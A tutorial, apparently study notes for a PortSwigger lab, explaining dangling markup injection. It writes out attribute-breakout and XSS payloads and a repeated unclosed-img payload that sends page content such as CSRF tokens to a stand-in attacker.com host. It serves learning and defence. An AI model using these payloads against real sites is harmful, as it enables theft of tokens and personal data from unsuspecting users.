Think of **dangling markup injection** as:

> **Breaking out of an HTML attribute, then deliberately leaving a quote/tag unfinished so the browser accidentally includes sensitive page content in a request to your server.**

It is useful when **XSS is blocked**, but you can still control part of the HTML.

### 1. The vulnerable situation

Imagine the server generates:

```html
<input type="text" name="username" value="USER_INPUT">
```

If you enter:

```text
hello
```

the response becomes:

```html
<input type="text" name="username" value="hello">
```

Normally, your input is safely inside the `value="..."` attribute.

---

### 2. Break out of the attribute

Suppose you enter:

```html
">
```

The response becomes:

```html
<input type="text" name="username" value="">
```

You've effectively escaped from the `value` attribute.

The important part is:

```text
"
```

closes the existing attribute.

And:

```text
>
```

closes the `<input>` tag.

---

### 3. Normally you'd try XSS

You might try:

```html
"><script>alert(1)</script>
```

But imagine the application has a CSP or input filtering that prevents JavaScript from executing.

So:

**XSS ❌**

But we can try something different.

---

### 4. The dangling markup trick

Payload:

```html
"><img src='https://attacker.com/? 
```

Notice something important:

```html
src='
```

starts a quoted attribute, **but we never close the `'`**.

So the browser sees something conceptually like:

```html
<img src='https://attacker.com/? EVERYTHING_AFTER_HERE
```

The quote is **dangling**.

The browser keeps reading the HTML response looking for the next `'`.

---

### 5. Why is that dangerous?

Imagine the server's response after your injection contains:

```html
<img src='https://attacker.com/?

CSRF_TOKEN=abc123
User email: victim@example.com
Account balance: $5000
...
'
```

Because the `src` attribute is still open, the browser interprets that content as part of the URL.

Conceptually, it makes a request like:

```http
GET /?CSRF_TOKEN=abc123%20User%20email%3A...
Host: attacker.com
```

So the attacker may receive data that appeared **after the injection point**.

That's the key idea:

```text
Attacker input
     ↓
break HTML attribute
     ↓
create unfinished attribute
     ↓
browser keeps consuming page content
     ↓
content becomes part of URL
     ↓
browser sends request
     ↓
attacker receives data
```

---

## Why is it called "dangling"?

Because the quote is left hanging:

```html
<img src='https://attacker.com/?
                       ↑
                 quote is missing
```

The browser doesn't know where the attribute ends, so it continues parsing until it encounters another `'`.

---

## The important difference from XSS

### XSS

Goal:

```text
Execute JavaScript
```

Example:

```html
"><script>alert(1)</script>
```

### Dangling markup

Goal:

```text
Make the browser send page content somewhere
```

Example:

```html
"><img src='https://attacker.com/?
```

So you don't necessarily need JavaScript.

That's why dangling markup can sometimes work when:

- `<script>` is filtered
    
- event handlers are blocked
    
- CSP prevents JavaScript
    
- normal XSS payloads don't execute
    

---

## What can be leaked?

Depending on where the injection occurs, potentially:

- CSRF tokens
    
- emails
    
- usernames
    
- sensitive text
    
- page contents
    
- other secrets rendered after the injection point
    

But there is an important limitation:

> **The data must appear in the HTTP response after your injection point.**

If the secret appears before your injection, this particular technique won't magically retrieve it.

---

## What does the difficult PortSwigger lab mean?

The lab says:

> "all external requests are blocked."

That means the obvious:

```html
<img src='https://attacker.com/?
```

approach doesn't work because the browser cannot directly make the external request.

So the challenge becomes:

```text
Inject markup
     ↓
capture/store data somewhere in the browser/page
     ↓
retrieve it later
     ↓
get it to your exploit server
```

That's why the lab mentions **tags that allow you to store data and retrieve it later**.

The key concept to remember for the lab is:

> **Dangling markup isn't primarily about executing code. It's about abusing the browser's HTML parser so that sensitive response content becomes part of attacker-controlled markup.**

### One-line exam note

**Dangling markup injection = breaking out of an HTML attribute and leaving a new attribute unclosed, causing the browser to consume subsequent page content as attacker-controlled markup/data.**